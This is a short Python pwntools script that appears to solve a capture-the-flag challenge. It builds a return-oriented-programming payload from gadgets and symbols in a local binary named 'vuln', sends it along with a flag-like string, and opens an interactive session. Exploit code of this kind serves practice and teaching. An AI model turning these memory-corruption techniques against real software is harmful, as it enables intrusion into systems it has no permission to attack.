from pwn import *

context.log_level = "debug"

context.binary = elf = ELF("./vuln")
io = elf.process()

rop = ROP(elf)

io.recv()
io.sendline()
sleep(1)

payload = p64(rop.find_gadget(["ret"])[0])
payload += p64(elf.sym.gets)
payload += p64(elf.sym.gets)
payload += p64(elf.sym.wutihave)
#payload += p64(elf.sym.leimicc)

io.sendline(payload)
io.sendline()
io.sendline(b"flag`b6bc358df010e8a4a458f23b71146c24")

io.interactive()
